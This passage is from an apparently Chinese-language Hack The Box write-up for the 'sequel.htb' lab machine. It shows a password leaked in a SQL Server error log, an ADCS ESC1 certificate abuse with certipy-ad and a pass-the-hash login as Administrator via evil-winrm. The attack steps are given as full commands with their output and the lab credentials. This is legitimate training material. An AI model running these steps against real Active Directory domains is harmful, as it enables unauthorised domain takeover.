+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc<span class="se">\D</span>ocuments&gt;
+</span></span></code></pre></div><p>登陆成功，继续信息收集</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers&gt; ls
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                -------------         ------ ----
+</span></span><span class="line"><span class="cl">d-----         2/7/2023   8:58 AM                Administrator
+</span></span><span class="line"><span class="cl">d-r---        7/20/2021  12:23 PM                Public
+</span></span><span class="line"><span class="cl">d-----         2/1/2023   6:37 PM                Ryan.Cooper
+</span></span><span class="line"><span class="cl">d-----         2/7/2023   8:10 AM                sql_svc
+</span></span></code></pre></div><p>发现另一个用户<code>Ryan.Cooper</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\S</span>QLServer<span class="se">\L</span>ogs&gt; ls
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\S</span>QLServer<span class="se">\L</span>ogs
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                -------------         ------ ----
+</span></span><span class="line"><span class="cl">-a----         2/7/2023   8:06 AM          <span class="m">27608</span> ERRORLOG.BAK
+</span></span></code></pre></div><p>在这个目录找到个错误日志的备份，<code>type</code>查看一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span> <span class="mi">13</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mf">07.44</span> <span class="n">Logon</span>       <span class="n">Error</span><span class="p">:</span> <span class="mi">18456</span><span class="p">,</span> <span class="n">Severity</span><span class="p">:</span> <span class="mi">14</span><span class="p">,</span> <span class="n">State</span><span class="p">:</span> <span class="mf">8.</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span> <span class="mi">13</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mf">07.44</span> <span class="n">Logon</span>       <span class="n">Logon</span> <span class="n">failed</span> <span class="k">for</span> <span class="n">user</span> <span class="s1">&#39;sequel.htb\Ryan.Cooper&#39;</span><span class="o">.</span> <span class="n">Reason</span><span class="p">:</span> <span class="n">Password</span> <span class="n">did</span> <span class="ow">not</span> <span class="n">match</span> <span class="n">that</span> <span class="k">for</span> <span class="n">the</span> <span class="n">login</span> <span class="n">provided</span><span class="o">.</span> <span class="p">[</span><span class="n">CLIENT</span><span class="p">:</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span> <span class="mi">13</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mf">07.48</span> <span class="n">Logon</span>       <span class="n">Error</span><span class="p">:</span> <span class="mi">18456</span><span class="p">,</span> <span class="n">Severity</span><span class="p">:</span> <span class="mi">14</span><span class="p">,</span> <span class="n">State</span><span class="p">:</span> <span class="mf">8.</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span> <span class="mi">13</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mf">07.48</span> <span class="n">Logon</span>       <span class="n">Logon</span> <span class="n">failed</span> <span class="k">for</span> <span class="n">user</span> <span class="s1">&#39;NuclearMosquito3&#39;</span><span class="o">.</span> <span class="n">Reason</span><span class="p">:</span> <span class="n">Password</span> <span class="n">did</span> <span class="ow">not</span> <span class="n">match</span> <span class="n">that</span> <span class="k">for</span> <span class="n">the</span> <span class="n">login</span> <span class="n">provided</span><span class="o">.</span> <span class="p">[</span><span class="n">CLIENT</span><span class="p">:</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span> <span class="mi">13</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mf">07.72</span> <span class="n">spid51</span>      <span class="n">Attempting</span> <span class="n">to</span> <span class="nb">load</span> <span class="n">library</span> <span class="s1">&#39;xpstar.dll&#39;</span> <span class="n">into</span> <span class="n">memory</span><span class="o">.</span> <span class="n">This</span> <span class="n">is</span> <span class="n">an</span> <span class="n">informational</span> <span class="n">message</span> <span class="n">only</span><span class="o">.</span> <span class="n">No</span> <span class="n">user</span> <span class="n">action</span> <span class="n">is</span> <span class="n">required</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span> <span class="mi">13</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mf">07.76</span> <span class="n">spid51</span>      <span class="n">Using</span> <span class="s1">&#39;xpstar.dll&#39;</span> <span class="n">version</span> <span class="s1">&#39;2019.150.2000&#39;</span> <span class="n">to</span> <span class="n">execute</span> <span class="n">extended</span> <span class="n">stored</span> <span class="n">procedure</span> <span class="s1">&#39;xp_sqlagent_is_starting&#39;</span><span class="o">.</span> <span class="n">This</span> <span class="n">is</span> <span class="n">an</span> <span class="n">informational</span> <span class="n">message</span> <span class="n">only</span><span class="p">;</span> <span class="n">no</span> <span class="n">user</span> <span class="n">action</span> <span class="n">is</span> <span class="n">required</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span> <span class="mi">13</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mf">08.24</span> <span class="n">spid51</span>      <span class="n">Changed</span> <span class="n">database</span> <span class="n">context</span> <span class="n">to</span> <span class="s1">&#39;master&#39;</span><span class="o">.</span>
+</span></span></code></pre></div><p>在日志的最后找到<code>Ryan.Cooper</code>用户的密码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username: Ryan.Cooper
+</span></span><span class="line"><span class="cl">password: NuclearMosquito3
+</span></span></code></pre></div><p>使用<code>netexec </code>继续验证一下该用户</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">netexec  winrm 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3
+</span></span><span class="line"><span class="cl">WINRM       10.10.11.202    <span class="m">5985</span>   DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:sequel.htb<span class="o">)</span>
+</span></span><span class="line"><span class="cl">WINRM       10.10.11.202    <span class="m">5985</span>   DC               <span class="o">[</span>+<span class="o">]</span> sequel.htb<span class="se">\R</span>yan.Cooper:NuclearMosquito3 <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</span></span></code></pre></div><p>奈斯！继续使用<code>evil-winrm</code>登录</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="sb">`</span>quoting_detection_proc<span class="err">&#39;</span> <span class="k">for</span> module Reline
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\R</span>yan.Cooper<span class="se">\D</span>ocuments&gt; whoami
+</span></span><span class="line"><span class="cl">sequel<span class="se">\r</span>yan.cooper
+</span></span></code></pre></div><p>登录成功，在该用户的<code>Desktop</code>找到<code>user.txt</code></p>
+<h1 id="esc1提权">
+<a class="header-anchor" href="#esc1%e6%8f%90%e6%9d%83"></a>
+ESC1提权
+</h1><p>使用<code>netexec </code>尝试在域中枚举ADCS</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">netexec ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs
+</span></span><span class="line"><span class="cl">SMB         10.10.11.202    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:sequel.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAPS       10.10.11.202    <span class="m">636</span>    DC               <span class="o">[</span>+<span class="o">]</span> sequel.htb<span class="se">\r</span>yan.cooper:NuclearMosquito3
+</span></span><span class="line"><span class="cl">ADCS        10.10.11.202    <span class="m">389</span>    DC               <span class="o">[</span>*<span class="o">]</span> Starting LDAP search with search filter <span class="s1">&#39;(objectClass=pKIEnrollmentService)&#39;</span>
+</span></span><span class="line"><span class="cl">ADCS        10.10.11.202    <span class="m">389</span>    DC               Found PKI Enrollment Server: dc.sequel.htb
+</span></span><span class="line"><span class="cl">ADCS        10.10.11.202    <span class="m">389</span>    DC               Found CN: sequel-DC-CA
+</span></span></code></pre></div><p>发现CA证书，使用<code>certipy-ad</code>寻找攻击点</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certipy-ad find -u <span class="s1">&#39;Ryan.Cooper&#39;</span> -p <span class="s1">&#39;NuclearMosquito3&#39;</span> -dc-ip 10.10.11.202 -stdout -vulnerable
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">34</span> certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate authorities
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">1</span> certificate authority
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">12</span> enabled certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;sequel-DC-CA&#39;</span> via CSRA
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Got error <span class="k">while</span> trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;sequel-DC-CA&#39;</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;sequel-DC-CA&#39;</span> via RRP
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got CA configuration <span class="k">for</span> <span class="s1">&#39;sequel-DC-CA&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Enumeration output:
+</span></span><span class="line"><span class="cl">Certificate Authorities
+</span></span><span class="line"><span class="cl">  <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    CA Name                             : sequel-DC-CA
+</span></span><span class="line"><span class="cl">    DNS Name                            : dc.sequel.htb
+</span></span><span class="line"><span class="cl">    Certificate Subject                 : <span class="nv">CN</span><span class="o">=</span>sequel-DC-CA, <span class="nv">DC</span><span class="o">=</span>sequel, <span class="nv">DC</span><span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
+</span></span><span class="line"><span class="cl">    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
+</span></span><span class="line"><span class="cl">    Certificate Validity End            : 2121-11-18 21:08:46+00:00
+</span></span><span class="line"><span class="cl">    Web Enrollment                      : Disabled
+</span></span><span class="line"><span class="cl">    User Specified SAN                  : Disabled
+</span></span><span class="line"><span class="cl">    Request Disposition                 : Issue
+</span></span><span class="line"><span class="cl">    Enforce Encryption <span class="k">for</span> Requests     : Enabled
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Owner                             : SEQUEL.HTB<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">      Access Rights
+</span></span><span class="line"><span class="cl">        ManageCertificates              : SEQUEL.HTB<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">                                          SEQUEL.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          SEQUEL.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        ManageCa                        : SEQUEL.HTB<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">                                          SEQUEL.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          SEQUEL.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        Enroll                          : SEQUEL.HTB<span class="se">\A</span>uthenticated Users
+</span></span><span class="line"><span class="cl">Certificate Templates
+</span></span><span class="line"><span class="cl">  <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    Template Name                       : UserAuthentication
+</span></span><span class="line"><span class="cl">    Display Name                        : UserAuthentication
+</span></span><span class="line"><span class="cl">    Certificate Authorities             : sequel-DC-CA
+</span></span><span class="line"><span class="cl">    Enabled                             : True
+</span></span><span class="line"><span class="cl">    Client Authentication               : True
+</span></span><span class="line"><span class="cl">    Enrollment Agent                    : False
+</span></span><span class="line"><span class="cl">    Any Purpose                         : False
+</span></span><span class="line"><span class="cl">    Enrollee Supplies Subject           : True
+</span></span><span class="line"><span class="cl">    Certificate Name Flag               : EnrolleeSuppliesSubject
+</span></span><span class="line"><span class="cl">    Enrollment Flag                     : PublishToDs
+</span></span><span class="line"><span class="cl">                                          IncludeSymmetricAlgorithms
+</span></span><span class="line"><span class="cl">    Private Key Flag                    : ExportableKey
+</span></span><span class="line"><span class="cl">    Extended Key Usage                  : Client Authentication
+</span></span><span class="line"><span class="cl">                                          Secure Email
+</span></span><span class="line"><span class="cl">                                          Encrypting File System
+</span></span><span class="line"><span class="cl">    Requires Manager Approval           : False
+</span></span><span class="line"><span class="cl">    Requires Key Archival               : False
+</span></span><span class="line"><span class="cl">    Authorized Signatures Required      : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    Validity Period                     : <span class="m">10</span> years
+</span></span><span class="line"><span class="cl">    Renewal Period                      : <span class="m">6</span> weeks
+</span></span><span class="line"><span class="cl">    Minimum RSA Key Length              : <span class="m">2048</span>
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Enrollment Permissions
+</span></span><span class="line"><span class="cl">        Enrollment Rights               : SEQUEL.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          SEQUEL.HTB<span class="se">\D</span>omain Users
+</span></span><span class="line"><span class="cl">                                          SEQUEL.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">      Object Control Permissions
+</span></span><span class="line"><span class="cl">        Owner                           : SEQUEL.HTB<span class="se">\A</span>dministrator
+</span></span><span class="line"><span class="cl">        Write Owner Principals          : SEQUEL.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          SEQUEL.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">                                          SEQUEL.HTB<span class="se">\A</span>dministrator
+</span></span><span class="line"><span class="cl">        Write Dacl Principals           : SEQUEL.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          SEQUEL.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">                                          SEQUEL.HTB<span class="se">\A</span>dministrator
+</span></span><span class="line"><span class="cl">        Write Property Principals       : SEQUEL.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          SEQUEL.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">                                          SEQUEL.HTB<span class="se">\A</span>dministrator
+</span></span><span class="line"><span class="cl">    <span class="o">[</span>!<span class="o">]</span> Vulnerabilities
+</span></span><span class="line"><span class="cl">      ESC1                              : <span class="s1">&#39;SEQUEL.HTB\\Domain Users&#39;</span> can enroll, enrollee supplies subject and template allows client authentication
+</span></span></code></pre></div><p>从最后的结果可知，可以利用ESC1提权</p>
+<blockquote>
+<p>参考链接：https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc1-template-allows-san</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certipy-ad req -u <span class="s1">&#39;Ryan.Cooper&#39;</span> -p <span class="s1">&#39;NuclearMosquito3&#39;</span> -ca <span class="s1">&#39;sequel-DC-CA&#39;</span> -dc-ip <span class="s1">&#39;10.10.11.202&#39;</span> -template <span class="s1">&#39;UserAuthentication&#39;</span> -upn <span class="s1">&#39;Administrator&#39;</span> -debug
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Generating RSA key
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting certificate via RPC
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Trying to connect to endpoint: ncacn_np:10.10.11.202<span class="o">[</span><span class="se">\p</span>ipe<span class="se">\c</span>ert<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Connected to endpoint: ncacn_np:10.10.11.202<span class="o">[</span><span class="se">\p</span>ipe<span class="se">\c</span>ert<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Successfully requested certificate
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Request ID is <span class="m">12</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got certificate with UPN <span class="s1">&#39;Administrator&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate has no object SID
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saved certificate and private key to <span class="s1">&#39;administrator.pfx&#39;</span>
+</span></span></code></pre></div><p>先同步一下时间</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ntpdate -s sequel.htb
+</span></span></code></pre></div><p>继续攻击</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certipy-ad auth -pfx administrator.pfx -username Administrator -domain sequel.htb -dc-ip 10.10.11.202 -debug
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using principal: administrator@sequel.htb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get TGT...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got TGT
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saved credential cache to <span class="s1">&#39;administrator.ccache&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to retrieve NT <span class="nb">hash</span> <span class="k">for</span> <span class="s1">&#39;administrator&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got <span class="nb">hash</span> <span class="k">for</span> <span class="s1">&#39;administrator@sequel.htb&#39;</span>: aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
+</span></span></code></pre></div><p>现在就拿到了Administrator的hash了，使用<code>netexec</code>测试能否通过<code>winrm</code>连接</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">netexec winrm 10.10.11.202 -u administrator -H aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
+</span></span><span class="line"><span class="cl">WINRM       10.10.11.202    <span class="m">5985</span>   DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:sequel.htb<span class="o">)</span>
+</span></span><span class="line"><span class="cl">WINRM       10.10.11.202    <span class="m">5985</span>   DC               <span class="o">[</span>+<span class="o">]</span> sequel.htb<span class="se">\a</span>dministrator:a52f78e4c751e5f5e17e1e9f3e58f4ee <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</span></span></code></pre></div><p>使用<code>evil-winrm</code>登录Administrator</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="sb">`</span>quoting_detection_proc<span class="err">&#39;</span> <span class="k">for</span> module Reline
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; whoami
+</span></span><span class="line"><span class="cl">sequel<span class="se">\a</span>dministrator
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
+</span></span></code></pre></div><p>成功登录Administrator，在<code>Desktop</code>找到<code>root.txt</code></p></div>
+    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/windows"
+        rel="tag"
+        >WINDOWS</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/adcs-esc1"
+        rel="tag"
+        >ADCS-ESC1</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/mssql"
+        rel="tag"
+        >MSSQL</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    aria-label="Article navigation"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap left"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_164.webp"
+              data-sizes="auto"
+              alt="第八届西湖论剑 初赛"
+              class="lazyload"
+            /><a
+          href="/post/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E5%88%9D%E8%B5%9B/"
+          aria-label="前一篇:第八届西湖论剑 初赛"
+          title="前一篇:第八届西湖论剑 初赛"
+        ></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">第八届西湖论剑 初赛</h3>
+      </div><div class="article-nav-link-wrap right"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_119.webp"
+              data-sizes="auto"
+              alt="HTB Authority"
+              class="lazyload"
+            /><a
+          href="/post/htb-authority/"
+          aria-label="后一篇:HTB Authority"
+          title="后一篇:HTB Authority"
+        ></a>
+        <div class="article-nav-caption">后一篇</div>
+        <h3 class="article-nav-title">HTB Authority</h3>
+      </div></nav></article><section id="comments" data-aos="fade-up">
+<div class="comment-header"><h2 class="comment-title">说些什么吧！</h2>
+  <div class="comment-selector">
+    <div class="comment-selector-wrap"><div class="selector-item" data-selector="gitalk">
+          <span>gitalk</span>
+        </div></div>
+  </div>
+</div>
+
+<div class="comment-content"><div class="comment gitalk-comment" data-aos="fade-up"
+     id="gitalk-comment">
+    </div></div>
+</section></section>
+        </div><footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2025<span class="footer-info-sep rotate"></span>
+      Ya1orin
+    </div><div>
+        基于&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Hugo</a
+        >&nbsp; Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;97.1k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;03:38</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >总访问量&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >总访客量&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#知识点">知识点</a></li>
+    <li><a href="#信息收集">信息收集</a></li>
+    <li><a href="#smb信息收集">SMB信息收集</a></li>
+    <li><a href="#mssql攻击">MSSQL攻击</a></li>
+    <li><a href="#后渗透">后渗透</a></li>
+    <li><a href="#esc1提权">ESC1提权</a></li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
